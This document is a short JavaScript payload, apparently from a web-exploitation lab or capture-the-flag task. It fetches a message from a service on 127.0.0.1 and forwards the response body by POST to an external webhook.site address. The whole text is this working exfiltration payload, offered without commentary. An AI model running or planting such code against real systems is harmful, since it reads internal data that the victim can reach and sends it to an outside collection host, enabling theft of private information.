fetch("http://127.0.0.1:80/message/3")
  .then((response) => {
    return response.text();
  })
  .then((data) => {
    fetch("https://webhook.site/db6373ae-d9d9-457b-9570-be60f11cea7a/", {
      headers: { "content-type": "application/json" },
      body: data,
      method: "POST",
      mode: "cors",
      credentials: "omit",
    });
  });

